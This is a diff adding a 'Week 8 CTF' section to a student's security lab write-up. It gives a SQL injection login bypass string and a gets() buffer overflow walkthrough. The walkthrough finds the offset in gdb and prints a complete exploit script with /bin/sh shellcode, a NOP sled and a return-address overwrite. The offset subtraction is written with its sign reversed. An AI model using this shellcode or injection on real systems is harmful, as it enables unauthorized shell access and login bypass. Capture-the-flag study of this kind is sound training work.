@@ -160,3 +160,65 @@ And just like we wanted to, we have gained access to Boby's account using a pass
     <img src="screenshots/boby_profile.png">
 </p>
 
+# Week 8 CTF
+
+## Challenge 1
+
+To login as admin, we used the `admin'; -- ` string on the user field. 
+Like in task 2.1, it allows the password verification to be ignored and login as admin.
+
+## Challenge 2
+
+Examining the program code, we quickly noticed a vulnerability in a `gets()` call.
+This meant we could explore it by performing a buffer overflow.
+
+However, by running `checksec`, we noticed that the PIE protection was active.
+This conveys that the buffer and the base pointer would be at random addresses every execution.
+Nevertheless, the program was kind enough to give us the address of the buffer.
+Even though the latter is randomized, the relative position between the buffer and base pointer stay the same.
+
+To get this offset, we used `gdb`:
+
+```bash
+gdb-peda$ p &buffer
+$1 = (char (*)[100]) 0xffffcdf0
+gdb-peda$ p $ebp
+$2 = (void *) 0xffffce58
+``` 
+
+Thus follows:
+
+```
+offset = 0xffffcdf0 - 0xffffce58 = 104
+```
+> **_NOTE:_**  Because the offset is calculated with the $ebp, we will need to sum an extra 4 bytes in order to reach the return address.
+
+
+In sum, we had all the information needed to create the exploit. 
+The final script looks like this:
+
+```py
+p.recvuntil(b"buffer is ")
+buf = int(p.recvline()[:-2], 16)
+
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
+).encode('latin-1')
+
+content = bytearray(0x90 for i in range(300)) 
+
+start = 300 - len(shellcode)
+content[start:start + len(shellcode)] = shellcode
+
+ret    = buf + 150 #putting it after the offset
+offset = 104 + 4
+
+L = 4
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+
+p.recvuntil(b"input:")
+p.sendline(content)
+p.interactive()
+```
